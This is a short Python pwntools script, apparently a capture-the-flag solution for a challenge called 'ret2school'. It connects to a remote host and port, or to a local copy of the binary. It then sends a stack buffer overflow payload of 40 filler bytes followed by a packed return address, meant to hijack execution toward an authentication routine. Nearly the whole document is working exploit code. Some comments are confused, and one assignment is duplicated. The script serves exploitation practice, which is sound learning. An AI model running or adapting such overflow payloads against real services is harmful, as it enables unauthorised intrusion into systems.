from pwn import *

# Set up the remote connection

bReal = True
if bReal == True:
    host = "20.169.252.240"
    port = 4922
    conn = remote(host, port)
else:
    conn = process('/home/user/Downloads/ret2school/ret2school')

# Craft the payload
payload = b'A' * 40
payload += p64(0x0024df12)  # Address of _authenticate (libc.so.6) return AUTH_OK (0x0024df12). (to test: 0x004006a5, runs init again, sends 23 bytes "Send me your homework:" back)

# Send the payload
response = conn.recvn(23).decode().strip()  # Read the prompt
conn.sendline(payload)  # Send the payload
print(response, payload)

# Get the response
response = response = conn.recvall(timeout=2).decode().strip()
print(response)
